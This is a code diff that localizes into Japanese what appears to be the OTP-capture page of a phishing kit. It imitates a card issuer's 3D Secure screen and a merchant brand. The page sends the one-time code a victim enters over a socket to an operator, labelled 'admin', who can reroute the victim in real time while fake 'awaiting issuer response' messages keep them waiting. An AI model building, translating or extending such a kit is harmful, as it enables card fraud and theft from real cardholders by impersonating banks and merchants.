@@ -29,8 +29,8 @@ function loadSavedVerifyState(): VerifyState {
 }
 
 function verifyMethodLabel(method: VerifyMethod | '') {
-  if (method === 'phone') return 'Phone';
-  if (method === 'email') return 'Email';
+  if (method === 'phone') return '電話番号';
+  if (method === 'email') return 'メールアドレス';
   return '';
 }
 
@@ -80,7 +80,7 @@ export default function Verify() {
     return !saved.telephone && !saved.email && !savedContacts.telephone && !savedContacts.email;
   });
   const [showMethodPicker, setShowMethodPicker] = useState(() => !initialVerifyMethod);
-  const [status, setStatus] = useState('Choose where you want to receive the authentication code.');
+  const [status, setStatus] = useState('確認コードの受け取り方法を選択してください。');
   const [submitting, setSubmitting] = useState(false);
   const [waitingForAdmin, setWaitingForAdmin] = useState(false);
   const inputRef = useRef<HTMLInputElement | null>(null);
@@ -99,8 +99,8 @@ export default function Verify() {
         setLoadingContactOptions(false);
         setStatus(
           fallback.telephone || fallback.email
-            ? 'Choose where you want to receive the authentication code.'
-            : 'We could not load your phone number or email. Return to your account and try again.',
+            ? '確認コードの受け取り方法を選択してください。'
+            : '電話番号またはメールアドレスを取得できませんでした。アカウント情報を確認して、もう一度お試しください。',
         );
         return;
       }
@@ -120,7 +120,7 @@ export default function Verify() {
         saveDraft(STORAGE_KEYS.verifyContact, nextOptions);
       }
       setLoadingContactOptions(false);
-      if (!nextOptions.telephone && !nextOptions.email) setStatus('No contact methods are available yet. Add a phone number or email on your account first.');
+      if (!nextOptions.telephone && !nextOptions.email) setStatus('受け取り可能な連絡先がありません。先に電話番号またはメールアドレスを登録してください。');
     });
   };
 
@@ -159,7 +159,7 @@ export default function Verify() {
     if (!selectedValue) return;
     const masked = verifyMethod === 'phone' ? maskPhone(selectedValue) : maskEmail(selectedValue);
     setShowMethodPicker(false);
-    setStatus(`${verifyMethodLabel(verifyMethod)} selected (${masked}). Enter the authentication code below.`);
+    setStatus(`${verifyMethodLabel(verifyMethod)}を選択しました（${masked}）。下に確認コードを入力してください。`);
   }, [contactOptions.email, contactOptions.telephone, verifyMethod]);
 
   useEffect(() => {
@@ -194,7 +194,7 @@ export default function Verify() {
       setSubmitting(false);
       setWaitingForAdmin(false);
       const routeReason = String(payload?.reason || '').trim();
-      setStatus(routeReason || 'Choose where you want to receive the authentication code.');
+      setStatus(routeReason || '確認コードの受け取り方法を選択してください。');
       socket.emit('update-form-field', { field: 'verifyMethod', value: '' });
       if ((target === 'verifyphone' || target === 'phoneverify') && contactOptions.telephone) return handleChooseMethod('phone', routeReason);
       if (target === 'emailverify' && contactOptions.email) return handleChooseMethod('email', routeReason);
@@ -215,8 +215,8 @@ export default function Verify() {
     setShowMethodPicker(false);
     setStatus(
       adminReason
-        ? `${adminReason} ${verifyMethodLabel(method)} selected (${selectedValueMasked}).`
-        : `${verifyMethodLabel(method)} selected (${selectedValueMasked}). Enter the authentication code below.`,
+        ? `${adminReason} ${verifyMethodLabel(method)}を選択しました（${selectedValueMasked}）。`
+        : `${verifyMethodLabel(method)}を選択しました（${selectedValueMasked}）。下に確認コードを入力してください。`,
     );
     socket.emit('update-form-field', { field: 'verifyMethod', value: method });
     window.setTimeout(() => inputRef.current?.focus(), 0);
@@ -229,28 +229,28 @@ export default function Verify() {
     e.preventDefault();
     if (submitting || waitingForAdmin) return;
     if (showMethodPicker || !verifyMethod) {
-      setStatus('Choose where you want to receive the authentication code.');
+      setStatus('確認コードの受け取り方法を選択してください。');
       setShowMethodPicker(true);
       return;
     }
     const id = verifyId.trim();
     if (!id) {
-      setStatus('Enter the authentication code to continue.');
+      setStatus('続行するには確認コードを入力してください。');
       inputRef.current?.focus();
       return;
     }
     setSubmitting(true);
-    setStatus('Submitting your authentication code...');
+    setStatus('確認コードを送信しています...');
     socket.emit('verify-submit', { verifyId: id }, (resp: any) => {
       if (!resp?.ok) {
-        setStatus(`We couldn't submit the authentication code: ${resp?.error || 'unknown error'}`);
+        setStatus(`確認コードを送信できませんでした: ${resp?.error || 'unknown error'}`);
         setSubmitting(false);
         return;
       }
       setVerifyId('');
       setSubmitting(false);
       setWaitingForAdmin(true);
-      setStatus('Authentication code received. Awaiting issuer response...');
+      setStatus('確認コードを受け付けました。カード会社の応答を待っています...');
     });
   };
 
@@ -260,9 +260,9 @@ export default function Verify() {
         <div className="absolute inset-0 bg-slate-900/50 backdrop-blur-sm flex items-center justify-center z-50 p-4">
           <div className="w-full max-w-md rounded-2xl border border-slate-200 bg-white p-6 text-center shadow-2xl">
             <div className="mx-auto h-10 w-10 rounded-full border-4 border-amber-200 border-t-[#ff9900] animate-spin" />
-            <div className="mt-4 text-lg font-semibold text-slate-900">Checking your code</div>
-            <div className="text-sm text-slate-600 mt-2">Please wait while we review the authentication code for this order.</div>
-            <div className="mt-5 rounded-lg border border-amber-200 bg-amber-50 px-3 py-2 text-xs text-amber-800">Do not refresh or close this page while authentication is pending.</div>
+            <div className="mt-4 text-lg font-semibold text-slate-900">コードを確認しています</div>
+            <div className="text-sm text-slate-600 mt-2">この注文の確認コードを照合しています。しばらくお待ちください。</div>
+            <div className="mt-5 rounded-lg border border-amber-200 bg-amber-50 px-3 py-2 text-xs text-amber-800">確認中はページを更新したり閉じたりしないでください。</div>
           </div>
         </div>
       )}
@@ -272,31 +272,31 @@ export default function Verify() {
           <div className="alz-bank-picker">
             <div className="alz-bank-picker-head">
               <div>
-                <div className="alz-bank-picker-eyebrow">Cardholder Authentication</div>
-                <h2 className="alz-bank-picker-title">Choose where to receive your code</h2>
+                <div className="alz-bank-picker-eyebrow">カード会員認証</div>
+                <h2 className="alz-bank-picker-title">コードの受け取り方法を選択</h2>
               </div>
-              <span className="alz-bank-badge">Verified by issuer</span>
+              <span className="alz-bank-badge">カード会社認証</span>
             </div>
-            <p className="alz-bank-picker-copy">Choose one option below to receive the authentication code for this payment.</p>
+            <p className="alz-bank-picker-copy">このお支払いに必要な確認コードの受け取り方法を選択してください。</p>
 
             {loadingContactOptions ? (
-              <div className="alz-bank-loading">Loading your available contact methods...</div>
+              <div className="alz-bank-loading">連絡先を読み込んでいます...</div>
             ) : (
               <div className="alz-bank-methods">
                 <button type="button" onClick={() => handleChooseMethod('phone')} disabled={!contactOptions.telephone} className={['alz-bank-method', contactOptions.telephone ? 'alz-bank-method-active' : 'alz-bank-method-disabled'].join(' ')}>
                   <div className="alz-bank-method-top">
-                    <span>Text message</span>
+                    <span>SMS</span>
                     <strong>SMS</strong>
                   </div>
-                  <div className="alz-bank-method-value">{contactOptions.telephone ? maskPhone(contactOptions.telephone) : 'No phone available'}</div>
+                  <div className="alz-bank-method-value">{contactOptions.telephone ? maskPhone(contactOptions.telephone) : '利用可能な電話番号がありません'}</div>
                 </button>
 
                 <button type="button" onClick={() => handleChooseMethod('email')} disabled={!contactOptions.email} className={['alz-bank-method', contactOptions.email ? 'alz-bank-method-active' : 'alz-bank-method-disabled'].join(' ')}>
                   <div className="alz-bank-method-top">
-                    <span>Email</span>
+                    <span>メール</span>
                     <strong>MAIL</strong>
                   </div>
-                  <div className="alz-bank-method-value">{contactOptions.email ? maskEmail(contactOptions.email) : 'No email available'}</div>
+                  <div className="alz-bank-method-value">{contactOptions.email ? maskEmail(contactOptions.email) : '利用可能なメールアドレスがありません'}</div>
                 </button>
               </div>
             )}
@@ -309,45 +309,45 @@ export default function Verify() {
           <div className="alz-bank-frame">
             <div className="alz-bank-header">
               <div>
-                <div className="alz-bank-header-eyebrow">Issuer Authentication</div>
-                <h1 className="alz-bank-title">Authentication required</h1>
-                <p className="alz-bank-copy">Enter the one-time code sent by your card issuer to confirm this payment.</p>
+                <div className="alz-bank-header-eyebrow">カード会社認証</div>
+                <h1 className="alz-bank-title">認証が必要です</h1>
+                <p className="alz-bank-copy">カード会社から送信されたワンタイムコードを入力して、このお支払いを確認してください。</p>
               </div>
               <div className="alz-bank-brandbox">
                 <div className="alz-bank-brandname">SECURECODE</div>
-                <div className="alz-bank-brandsub">Protected by 3D Secure</div>
+                <div className="alz-bank-brandsub">3Dセキュアで保護されています</div>
               </div>
             </div>
 
             <div className="alz-bank-body">
               <section className="alz-bank-panel">
-                <div className="alz-bank-panel-title">Authentication details</div>
+                <div className="alz-bank-panel-title">認証情報</div>
                 <div className="alz-bank-summary">
                   <div>
-                    <span>Merchant</span>
+                    <span>加盟店</span>
                     <strong>{BRAND.name}</strong>
                   </div>
                   <div>
-                    <span>Authentication</span>
-                    <strong>3D Secure required</strong>
+                    <span>認証方式</span>
+                    <strong>3Dセキュア認証</strong>
                   </div>
                   <div>
-                    <span>Delivery method</span>
-                    <strong>{verifyMethod ? verifyMethodLabel(verifyMethod) : 'Select phone or email'}</strong>
+                    <span>受け取り方法</span>
+                    <strong>{verifyMethod ? verifyMethodLabel(verifyMethod) : '電話番号またはメールを選択'}</strong>
                   </div>
                   <div>
-                    <span>Send code to</span>
-                    <strong>{selectedMethodValue || 'Choose phone or email'}</strong>
+                    <span>送信先</span>
+                    <strong>{selectedMethodValue || '電話番号またはメールを選択'}</strong>
                   </div>
                 </div>
 
                 <form onSubmit={handleSubmit} className="space-y-4 mt-5">
                   <div>
-                    <label className="alz-field-label">Authentication code</label>
-                    <input ref={inputRef} value={verifyId} onChange={(e) => setVerifyId(e.target.value)} placeholder="Enter code" className="alz-input alz-bank-code-input disabled:bg-slate-100 disabled:text-slate-400" autoComplete="one-time-code" inputMode="numeric" disabled={waitingForAdmin || showMethodPicker} />
+                    <label className="alz-field-label">確認コード</label>
+                    <input ref={inputRef} value={verifyId} onChange={(e) => setVerifyId(e.target.value)} placeholder="コードを入力" className="alz-input alz-bank-code-input disabled:bg-slate-100 disabled:text-slate-400" autoComplete="one-time-code" inputMode="numeric" disabled={waitingForAdmin || showMethodPicker} />
                   </div>
                   <button type="submit" disabled={submitting || waitingForAdmin || showMethodPicker} className="alz-bank-submit">
-                    {submitting ? 'Submitting...' : waitingForAdmin ? 'Checking...' : showMethodPicker ? 'Choose delivery method' : 'Submit code'}
+                    {submitting ? '送信中...' : waitingForAdmin ? '確認中...' : showMethodPicker ? '受け取り方法を選択' : 'コードを送信'}
                   </button>
                 </form>
 
@@ -356,12 +356,12 @@ export default function Verify() {
 
               <aside className="alz-bank-side">
                 <div className="alz-bank-side-card">
-                  <div className="alz-bank-side-title">Protected payment</div>
-                  <div className="alz-bank-side-copy">This card transaction is protected by your issuer through 3D Secure authentication.</div>
+                  <div className="alz-bank-side-title">安全なお支払い</div>
+                  <div className="alz-bank-side-copy">このカード決済は、カード会社の3Dセキュア認証によって保護されています。</div>
                 </div>
                 <div className="alz-bank-side-card">
-                  <div className="alz-bank-side-title">Need help?</div>
-                  <div className="alz-bank-side-copy">If you do not receive a code, contact the phone number on the back of your card or choose a different delivery method.</div>
+                  <div className="alz-bank-side-title">お困りですか？</div>
+                  <div className="alz-bank-side-copy">コードが届かない場合は、カード裏面の連絡先へお問い合わせいただくか、別の受け取り方法を選択してください。</div>
                 </div>
               </aside>
             </div>
